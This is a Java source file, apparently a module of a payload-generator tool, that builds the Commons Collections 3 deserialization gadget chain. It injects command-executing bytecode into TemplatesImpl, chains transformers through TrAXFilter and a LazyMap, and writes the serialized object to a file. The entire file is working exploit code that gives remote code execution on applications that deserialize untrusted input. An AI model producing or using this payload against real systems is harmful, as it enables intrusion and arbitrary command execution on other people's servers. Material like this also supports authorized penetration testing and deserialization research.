package com.exp.collections;


import com.constant.PayloadGenerator;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3 extends PayloadGenerator {

    @Override
    protected File generatorPayload(String[] cmd) {
        Templates templates = new TemplatesImpl();
        this.setValueByField("_bytecodes",templates,createClassFile(cmd),Modifier.PRIVATE);
        this.setValueByField("_name",templates,"123",Modifier.PRIVATE);
        this.setValueByField("_tfactory",templates,new TransformerFactoryImpl(), Modifier.PRIVATE);

        Transformer transformers = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        });
        Transformer transformer = new ConstantTransformer("1");
        Map innerMap = new HashMap();
        Map targetMap = LazyMap.decorate(innerMap,transformer);
        this.setValueByField("factory",targetMap,transformers, Modifier.PRIVATE);
        return getFile(targetMap);
    }

}
